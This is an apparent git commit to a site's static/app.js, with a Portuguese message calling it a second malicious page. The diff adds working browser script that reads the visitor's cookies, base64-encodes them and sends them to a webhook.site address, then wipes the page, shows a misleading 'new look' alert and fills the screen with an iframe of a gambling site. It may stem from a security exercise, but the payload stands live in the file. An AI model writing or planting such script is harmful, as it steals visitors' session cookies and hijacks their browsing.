fe693cf329c38882cd266929f8973eb1c3762d0c
Sekqies <fernando.ellerbrock@gmail.com>
2026-03-27 09:34:26 -0300

    adicionada segunda página maligna

--- static/app.js
+++ static/app.js
@@ -1,3 +1,15 @@
-document.body.innerHTML = "hackeado pelo big evil dimitri"
+const cookie = document.cookie;
 
-alert(document.cookie)
+fetch("https://webhook.site/20e0de09-81e0-4e52-803d-be00689635d1?cookie=" + btoa(cookie), {
+    mode: 'no-cors'
+});
+
+document.body.innerHTML = '';
+document.body.style.margin = '0';
+document.body.style.overflow = 'hidden';
+
+alert("O site está com cara nova!")
+
+document.body.innerHTML = `
+    <iframe src="https://brazino777.com" style="width: 100vw; height: 100vh; border: none;"></iframe>
+`;
